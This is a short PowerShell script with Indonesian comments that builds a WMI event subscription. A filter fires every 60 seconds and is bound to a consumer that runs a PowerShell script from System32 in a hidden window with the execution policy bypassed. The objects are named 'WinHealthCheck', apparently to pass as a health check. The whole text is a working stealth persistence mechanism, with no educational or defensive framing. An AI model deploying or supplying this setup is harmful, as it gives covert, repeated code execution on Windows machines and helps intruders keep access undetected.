# 1. Filter: Pemicu setiap 60 detik
$Filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{
    Name = "WinHealthCheckFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"
}

# 2. Consumer: Jalankan script secara Hidden
$Consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{
    Name = "WinHealthCheckConsumer"
    CommandLineTemplate = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\System32\win_service.ps1"
}

# 3. Binding: Ikat Filter dan Consumer
Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}
